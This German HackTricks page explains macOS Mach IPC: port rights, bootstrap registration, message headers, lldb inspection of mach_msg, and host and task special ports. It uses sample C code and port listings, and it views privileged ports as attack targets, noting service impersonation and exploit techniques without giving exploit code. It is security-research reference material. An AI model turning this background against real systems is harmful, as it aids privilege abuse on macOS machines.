# macOS IPC - Inter Process Communication

{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstütze HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## Mach-Nachrichten über Ports

### Grundlegende Informationen

Mach verwendet **Tasks** als die **kleinste Einheit** zum Teilen von Ressourcen, und jeder Task kann **mehrere Threads** enthalten. Diese **Tasks und Threads sind 1:1 auf POSIX-Prozesse und -Threads abgebildet**.

Die Kommunikation zwischen Tasks erfolgt über Mach Inter-Process Communication (IPC) und nutzt einseitige Kommunikationskanäle. **Nachrichten werden zwischen Ports übertragen**, die eine Art **Nachrichtenwarteschlangen** sind, die vom Kernel verwaltet werden.

Ein **Port** ist das **grundlegende** Element von Mach IPC. Er kann verwendet werden, um **Nachrichten zu senden und zu empfangen**.

Jeder Prozess hat eine **IPC-Tabelle**, in der die **Mach-Ports des Prozesses** zu finden sind. Der Name eines Mach-Ports ist tatsächlich eine Nummer (ein Zeiger auf das Kernel-Objekt).

Ein Prozess kann auch einen Portnamen mit bestimmten Rechten **an einen anderen Task** senden, und der Kernel wird diesen Eintrag in der **IPC-Tabelle des anderen Tasks** erscheinen lassen.

### Portrechte

Portrechte, die definieren, welche Operationen ein Task ausführen kann, sind entscheidend für diese Kommunikation. Die möglichen **Portrechte** sind ([Definitionen hier](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Empfangsrecht**, das das Empfangen von Nachrichten, die an den Port gesendet werden, erlaubt. Mach-Ports sind MPSC (multiple-producer, single-consumer) Warteschlangen, was bedeutet, dass es im gesamten System **nur ein Empfangsrecht für jeden Port** geben kann (im Gegensatz zu Pipes, bei denen mehrere Prozesse alle Dateideskriptoren zum Leseende einer Pipe halten können).
* Ein **Task mit dem Empfangsrecht** kann Nachrichten empfangen und **Sende-Rechte erstellen**, die es ihm ermöglichen, Nachrichten zu senden. Ursprünglich hat nur der **eigene Task das Empfangsrecht über seinen Port**.
* Wenn der Besitzer des Empfangsrechts **stirbt** oder es tötet, wird das **Sende-Recht nutzlos (toter Name).**
* **Sende-Recht**, das das Senden von Nachrichten an den Port erlaubt.
* Das Sende-Recht kann **kloniert** werden, sodass ein Task, der ein Sende-Recht besitzt, das Recht klonen und **einem dritten Task gewähren** kann.
* Beachte, dass **Portrechte** auch durch Mach-Nachrichten **übertragen** werden können.
* **Send-once-Recht**, das das Senden einer Nachricht an den Port erlaubt und dann verschwindet.
* Dieses Recht **kann nicht** **kloniert** werden, aber es kann **verschoben** werden.
* **Port-Set-Recht**, das ein _Port-Set_ anstelle eines einzelnen Ports bezeichnet. Das Entnehmen einer Nachricht aus einem Port-Set entnimmt eine Nachricht aus einem der enthaltenen Ports. Port-Sets können verwendet werden, um gleichzeitig auf mehreren Ports zu hören, ähnlich wie `select`/`poll`/`epoll`/`kqueue` in Unix.
* **Toter Name**, der kein tatsächliches Portrecht ist, sondern lediglich ein Platzhalter. Wenn ein Port zerstört wird, verwandeln sich alle bestehenden Portrechte für den Port in tote Namen.

**Tasks können SEND-Rechte an andere übertragen**, wodurch sie in der Lage sind, Nachrichten zurückzusenden. **SEND-Rechte können auch geklont werden, sodass ein Task das Recht duplizieren und einem dritten Task geben kann**. Dies, kombiniert mit einem Zwischenprozess, der als **Bootstrap-Server** bekannt ist, ermöglicht eine effektive Kommunikation zwischen Tasks.

### Datei-Ports

Datei-Ports ermöglichen es, Dateideskriptoren in Mach-Ports zu kapseln (unter Verwendung von Mach-Port-Rechten). Es ist möglich, einen `fileport` aus einem gegebenen FD mit `fileport_makeport` zu erstellen und einen FD aus einem fileport mit `fileport_makefd` zu erstellen.

### Etablierung einer Kommunikation

Wie bereits erwähnt, ist es möglich, Rechte mit Mach-Nachrichten zu senden, jedoch **kannst du kein Recht senden, ohne bereits ein Recht zu haben**, um eine Mach-Nachricht zu senden. Wie wird also die erste Kommunikation hergestellt?

Dafür ist der **Bootstrap-Server** (**launchd** in macOS) beteiligt, da **jeder ein SEND-Recht zum Bootstrap-Server erhalten kann**, ist es möglich, ihn um ein Recht zu bitten, um eine Nachricht an einen anderen Prozess zu senden:

1. Task **A** erstellt einen **neuen Port** und erhält das **EMPFAHRSRECHT** dafür.
2. Task **A**, als Inhaber des EMPFAHRSRECHTS, **generiert ein SEND-Recht für den Port**.
3. Task **A** stellt eine **Verbindung** mit dem **Bootstrap-Server** her und **sendet ihm das SEND-Recht** für den Port, den es zu Beginn generiert hat.
* Denk daran, dass jeder ein SEND-Recht zum Bootstrap-Server erhalten kann.
4. Task A sendet eine `bootstrap_register`-Nachricht an den Bootstrap-Server, um **den gegebenen Port mit einem Namen** wie `com.apple.taska` zu verknüpfen.
5. Task **B** interagiert mit dem **Bootstrap-Server**, um eine Bootstrap-**Suche nach dem Dienstnamen** (`bootstrap_lookup`) durchzuführen. Damit der Bootstrap-Server antworten kann, sendet Task B ihm ein **SEND-Recht zu einem Port, den es zuvor erstellt hat**, innerhalb der Suchnachricht. Wenn die Suche erfolgreich ist, **dupliziert der Server das SEND-Recht**, das von Task A empfangen wurde, und **überträgt es an Task B**.
* Denk daran, dass jeder ein SEND-Recht zum Bootstrap-Server erhalten kann.
6. Mit diesem SEND-Recht ist **Task B** in der Lage, eine **Nachricht** **an Task A** zu **senden**.
7. Für eine bidirektionale Kommunikation generiert normalerweise Task **B** einen neuen Port mit einem **EMPFAHRSRECHT** und einem **SEND-RECHT** und gibt das **SEND-Recht an Task A**, damit es Nachrichten an TASK B senden kann (bidirektionale Kommunikation).

Der Bootstrap-Server **kann den Dienstnamen, der von einem Task beansprucht wird, nicht authentifizieren**. Das bedeutet, dass ein **Task** potenziell **jede Systemaufgabe impersonieren** könnte, indem er fälschlicherweise **einen Autorisierungsdienstnamen beansprucht** und dann jede Anfrage genehmigt.

Dann speichert Apple die **Namen der systemeigenen Dienste** in sicheren Konfigurationsdateien, die sich in **SIP-geschützten** Verzeichnissen befinden: `/System/Library/LaunchDaemons` und `/System/Library/LaunchAgents`. Neben jedem Dienstnamen wird auch die **assoziierte Binärdatei gespeichert**. Der Bootstrap-Server wird ein **EMPFAHRSRECHT für jeden dieser Dienstnamen** erstellen und halten.

Für diese vordefinierten Dienste unterscheidet sich der **Suchprozess leicht**. Wenn ein Dienstname gesucht wird, startet launchd den Dienst dynamisch. Der neue Workflow ist wie folgt:

* Task **B** initiiert eine Bootstrap-**Suche** nach einem Dienstnamen.
* **launchd** überprüft, ob der Task läuft, und wenn nicht, **startet** er ihn.
* Task **A** (der Dienst) führt eine **Bootstrap-Check-in** (`bootstrap_check_in()`) durch. Hier erstellt der **Bootstrap-**Server ein SEND-Recht, behält es und **überträgt das EMPFAHRSRECHT an Task A**.
* launchd dupliziert das **SEND-Recht und sendet es an Task B**.
* Task **B** generiert einen neuen Port mit einem **EMPFAHRSRECHT** und einem **SEND-RECHT** und gibt das **SEND-Recht an Task A** (den Dienst) weiter, damit er Nachrichten an TASK B senden kann (bidirektionale Kommunikation).

Dieser Prozess gilt jedoch nur für vordefinierte Systemaufgaben. Nicht-Systemaufgaben funktionieren weiterhin wie ursprünglich beschrieben, was potenziell eine Impersonation ermöglichen könnte.

{% hint style="danger" %}
Daher sollte launchd niemals abstürzen, sonst stürzt das gesamte System ab.
{% endhint %}

### Eine Mach-Nachricht

[Hier mehr Informationen finden](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Die Funktion `mach_msg`, die im Wesentlichen ein Systemaufruf ist, wird verwendet, um Mach-Nachrichten zu senden und zu empfangen. Die Funktion erfordert, dass die zu sendende Nachricht als erstes Argument übergeben wird. Diese Nachricht muss mit einer `mach_msg_header_t`-Struktur beginnen, gefolgt vom eigentlichen Nachrichteninhalt. Die Struktur ist wie folgt definiert:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Prozesse, die über ein _**receive right**_ verfügen, können Nachrichten über einen Mach-Port empfangen. Umgekehrt wird den **Sendenden** ein _**send**_ oder ein _**send-once right**_ gewährt. Das send-once right ist ausschließlich zum Senden einer einzelnen Nachricht gedacht, nach der es ungültig wird.

Das anfängliche Feld **`msgh_bits`** ist ein Bitmap:

* Das erste Bit (am signifikantesten) wird verwendet, um anzuzeigen, dass eine Nachricht komplex ist (mehr dazu unten)
* Das 3. und 4. Bit werden vom Kernel verwendet
* Die **5 am wenigsten signifikanten Bits des 2. Bytes** können für **voucher** verwendet werden: ein anderer Typ von Port, um Schlüssel/Wert-Kombinationen zu senden.
* Die **5 am wenigsten signifikanten Bits des 3. Bytes** können für **local port** verwendet werden
* Die **5 am wenigsten signifikanten Bits des 4. Bytes** können für **remote port** verwendet werden

Die Typen, die im Voucher, lokalen und entfernten Ports angegeben werden können, sind (aus [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
For example, `MACH_MSG_TYPE_MAKE_SEND_ONCE` kann verwendet werden, um **anzuzeigen**, dass ein **send-once** **Recht** für diesen Port abgeleitet und übertragen werden sollte. Es kann auch `MACH_PORT_NULL` angegeben werden, um zu verhindern, dass der Empfänger antworten kann.

Um eine einfache **zweiseitige Kommunikation** zu erreichen, kann ein Prozess einen **mach port** im mach **Nachrichtenkopf** angeben, der als _Antwortport_ (**`msgh_local_port`**) bezeichnet wird, wo der **Empfänger** der Nachricht eine **Antwort** auf diese Nachricht senden kann.

{% hint style="success" %}
Beachten Sie, dass diese Art der zweiseitigen Kommunikation in XPC-Nachrichten verwendet wird, die eine Antwort erwarten (`xpc_connection_send_message_with_reply` und `xpc_connection_send_message_with_reply_sync`). Aber **normalerweise werden unterschiedliche Ports erstellt**, wie zuvor erklärt, um die zweiseitige Kommunikation zu schaffen.
{% endhint %}

Die anderen Felder des Nachrichtenkopfes sind:

* `msgh_size`: die Größe des gesamten Pakets.
* `msgh_remote_port`: der Port, über den diese Nachricht gesendet wird.
* `msgh_voucher_port`: [mach Gutscheine](https://robert.sesek.com/2023/6/mach\_vouchers.html).
* `msgh_id`: die ID dieser Nachricht, die vom Empfänger interpretiert wird.

{% hint style="danger" %}
Beachten Sie, dass **mach-Nachrichten über einen `mach port` gesendet werden**, der ein **einzelner Empfänger**, **mehrere Sender** Kommunikationskanal ist, der in den mach-Kernel integriert ist. **Mehrere Prozesse** können **Nachrichten** an einen mach-Port senden, aber zu jedem Zeitpunkt kann nur **ein einzelner Prozess** von ihm lesen.
{% endhint %}

Nachrichten werden dann durch den **`mach_msg_header_t`** Kopf gebildet, gefolgt vom **Inhalt** und vom **Trailer** (falls vorhanden), und es kann die Erlaubnis erteilt werden, darauf zu antworten. In diesen Fällen muss der Kernel die Nachricht nur von einer Aufgabe zur anderen weiterleiten.

Ein **Trailer** ist **Informationen, die vom Kernel zur Nachricht hinzugefügt werden** (kann nicht vom Benutzer festgelegt werden), die beim Empfang der Nachricht mit den Flags `MACH_RCV_TRAILER_<trailer_opt>` angefordert werden können (es gibt unterschiedliche Informationen, die angefordert werden können).

#### Komplexe Nachrichten

Es gibt jedoch auch andere, **komplexere** Nachrichten, wie die, die zusätzliche Portrechte übergeben oder Speicher teilen, bei denen der Kernel auch diese Objekte an den Empfänger senden muss. In diesen Fällen wird das signifikanteste Bit des Kopfes `msgh_bits` gesetzt.

Die möglichen Deskriptoren, die übergeben werden können, sind in [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) definiert:
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
In 32-Bit sind alle Deskriptoren 12B und der Deskriptor-Typ befindet sich im 11. Deskriptor. In 64-Bit variieren die Größen.

{% hint style="danger" %}
Der Kernel wird die Deskriptoren von einer Aufgabe zur anderen kopieren, aber zuerst **eine Kopie im Kernel-Speicher erstellen**. Diese Technik, bekannt als "Feng Shui", wurde in mehreren Exploits missbraucht, um den **Kernel dazu zu bringen, Daten in seinem Speicher zu kopieren**, wodurch ein Prozess Deskriptoren an sich selbst sendet. Dann kann der Prozess die Nachrichten empfangen (der Kernel wird sie freigeben).

Es ist auch möglich, **Port-Rechte an einen verwundbaren Prozess zu senden**, und die Port-Rechte werden einfach im Prozess erscheinen (auch wenn er sie nicht verwaltet).
{% endhint %}

### Mac Ports APIs

Beachten Sie, dass Ports mit dem Aufgabennamespace verbunden sind, sodass zum Erstellen oder Suchen eines Ports auch der Aufgabennamespace abgefragt wird (mehr in `mach/mach_port.h`):

* **`mach_port_allocate` | `mach_port_construct`**: **Erstellen** Sie einen Port.
* `mach_port_allocate` kann auch ein **Port-Set** erstellen: Empfangsrecht über eine Gruppe von Ports. Jedes Mal, wenn eine Nachricht empfangen wird, wird der Port angegeben, von dem sie stammt.
* `mach_port_allocate_name`: Ändern Sie den Namen des Ports (standardmäßig 32-Bit-Ganzzahl)
* `mach_port_names`: Holen Sie sich Portnamen von einem Ziel
* `mach_port_type`: Holen Sie sich die Rechte einer Aufgabe über einen Namen
* `mach_port_rename`: Benennen Sie einen Port um (wie dup2 für FDs)
* `mach_port_allocate`: Weisen Sie einen neuen RECEIVE, PORT_SET oder DEAD_NAME zu
* `mach_port_insert_right`: Erstellen Sie ein neues Recht in einem Port, in dem Sie RECEIVE haben
* `mach_port_...`
* **`mach_msg`** | **`mach_msg_overwrite`**: Funktionen, die verwendet werden, um **mach-Nachrichten zu senden und zu empfangen**. Die Überschreibungsversion ermöglicht es, einen anderen Puffer für den Nachrichteneingang anzugeben (die andere Version wird ihn einfach wiederverwenden).

### Debug mach\_msg

Da die Funktionen **`mach_msg`** und **`mach_msg_overwrite`** die sind, die verwendet werden, um Nachrichten zu senden und zu empfangen, würde das Setzen eines Haltepunkts auf ihnen ermöglichen, die gesendeten und empfangenen Nachrichten zu inspizieren.

Zum Beispiel starten Sie das Debuggen einer beliebigen Anwendung, die Sie debuggen können, da sie **`libSystem.B` laden wird, die diese Funktion verwenden wird**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Prozess 71019 gestartet: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Prozess 71019 gestoppt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
Ziel 0: (SandboxedShellApp) gestoppt.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

Um die Argumente von **`mach_msg`** zu erhalten, überprüfen Sie die Register. Dies sind die Argumente (aus [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Holen Sie die Werte aus den Registern:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Überprüfen Sie den Nachrichtenkopf und prüfen Sie das erste Argument:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Dieser Typ von `mach_msg_bits_t` ist sehr verbreitet, um eine Antwort zu ermöglichen.



### Ports auflisten
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
Der **name** ist der Standardname, der dem Port zugewiesen wird (überprüfen Sie, wie er in den ersten 3 Bytes **zunimmt**). Der **`ipc-object`** ist der **obfuskierte** eindeutige **Identifikator** des Ports.\
Beachten Sie auch, wie die Ports mit nur **`send`** Rechten den **Besitzer** identifizieren (Portname + pid).\
Beachten Sie auch die Verwendung von **`+`**, um **andere Aufgaben, die mit demselben Port verbunden sind**, anzuzeigen.

Es ist auch möglich, [**procesxp**](https://www.newosxbook.com/tools/procexp.html) zu verwenden, um auch die **registrierten Dienstnamen** zu sehen (mit deaktiviertem SIP aufgrund der Notwendigkeit von `com.apple.system-task-port`):
```
procesp 1 ports
```
Sie können dieses Tool auf iOS installieren, indem Sie es von [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) herunterladen.

### Codebeispiel

Beachten Sie, wie der **Sender** einen Port **zuweist**, ein **Senderecht** für den Namen `org.darlinghq.example` erstellt und es an den **Bootstrap-Server** sendet, während der Sender um das **Senderecht** dieses Namens bittet und es verwendet, um eine **Nachricht** zu **senden**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

## Privilegierte Ports

Es gibt einige spezielle Ports, die es ermöglichen, **bestimmte sensible Aktionen auszuführen oder auf bestimmte sensible Daten zuzugreifen**, falls ein Task die **SEND**-Berechtigungen über sie hat. Dies macht diese Ports aus der Perspektive eines Angreifers sehr interessant, nicht nur wegen der Möglichkeiten, sondern auch weil es möglich ist, **SEND-Berechtigungen zwischen Tasks zu teilen**.

### Host-Spezialports

Diese Ports werden durch eine Nummer dargestellt.

**SEND**-Rechte können durch den Aufruf von **`host_get_special_port`** und **RECEIVE**-Rechte durch den Aufruf von **`host_set_special_port`** erlangt werden. Beide Aufrufe erfordern jedoch den **`host_priv`**-Port, auf den nur der Root zugreifen kann. Darüber hinaus konnte Root in der Vergangenheit **`host_set_special_port`** aufrufen und beliebige Ports übernehmen, was es beispielsweise ermöglichte, Codesignaturen zu umgehen, indem `HOST_KEXTD_PORT` übernommen wurde (SIP verhindert dies jetzt).

Diese sind in 2 Gruppen unterteilt: Die **ersten 7 Ports gehören dem Kernel**, wobei der 1 `HOST_PORT`, der 2 `HOST_PRIV_PORT`, der 3 `HOST_IO_MASTER_PORT` und der 7 `HOST_MAX_SPECIAL_KERNEL_PORT` ist.\
Die Ports, die **ab** der Nummer **8** beginnen, sind **im Besitz von System-Daemons** und können in [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host\_special\_ports.h.auto.html) gefunden werden.

* **Host-Port**: Wenn ein Prozess über diesen Port die **SEND**-Berechtigung hat, kann er **Informationen** über das **System** abrufen, indem er seine Routinen aufruft wie:
* `host_processor_info`: Prozessorinformationen abrufen
* `host_info`: Hostinformationen abrufen
* `host_virtual_physical_table_info`: Virtuelle/Physische Seitentabelle (erfordert MACH\_VMDEBUG)
* `host_statistics`: Hoststatistiken abrufen
* `mach_memory_info`: Kernel-Speicherlayout abrufen
* **Host Priv-Port**: Ein Prozess mit **SEND**-Recht über diesen Port kann **privilegierte Aktionen** ausführen, wie z.B. Bootdaten anzeigen oder versuchen, eine Kernel-Erweiterung zu laden. Der **Prozess muss Root sein**, um diese Berechtigung zu erhalten.
* Darüber hinaus ist es erforderlich, um die **`kext_request`**-API aufzurufen, andere Berechtigungen **`com.apple.private.kext*`** zu haben, die nur Apple-Binärdateien gewährt werden.
* Andere Routinen, die aufgerufen werden können, sind:
* `host_get_boot_info`: `machine_boot_info()` abrufen
* `host_priv_statistics`: Privilegierte Statistiken abrufen
* `vm_allocate_cpm`: Kontinuierlichen physischen Speicher zuweisen
* `host_processors`: Senderecht an Host-Prozessoren
* `mach_vm_wire`: Speicher resident machen
* Da **Root** auf diese Berechtigung zugreifen kann, könnte er `host_set_[special/exception]_port[s]` aufrufen, um **Host-Spezial- oder Ausnahmeports zu übernehmen**.

Es ist möglich, **alle Host-Spezialports zu sehen**, indem man Folgendes ausführt:
```bash
procexp all ports | grep "HSP"
```
### Task Special Ports

Diese Ports sind für bekannte Dienste reserviert. Es ist möglich, sie mit `task_[get/set]_special_port` abzurufen/zu setzen. Sie sind in `task_special_ports.h` zu finden:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
From [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html):

* **TASK\_KERNEL\_PORT**\[task-self send right]: Der Port, der zur Steuerung dieser Aufgabe verwendet wird. Wird verwendet, um Nachrichten zu senden, die die Aufgabe betreffen. Dies ist der Port, der von **mach\_task\_self (siehe Task Ports unten)** zurückgegeben wird.
